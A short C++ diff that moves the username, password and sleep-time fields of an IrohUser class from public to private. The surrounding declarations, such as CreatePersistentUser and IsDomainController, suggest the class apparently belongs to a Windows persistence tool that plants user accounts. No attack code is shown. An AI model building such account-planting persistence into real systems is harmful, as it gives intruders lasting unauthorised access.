@@ -17,11 +17,7 @@ namespace Iroh {
 
 	class IrohUser
 	{
-	public:
-		std::wstring username;
-		std::wstring password;
-		INT sleepTime;
-		
+	public:	
 		IrohUser();
 		VOID SetUsername(std::string);
 		VOID SetPassword(std::string);
@@ -29,6 +25,10 @@ namespace Iroh {
 		VOID Start();
 
 	private:
+		std::wstring username;
+		std::wstring password;
+		INT sleepTime;
+
 		VOID UserLoop();
 		VOID CreatePersistentUser();
 		BOOL IsDomainController();
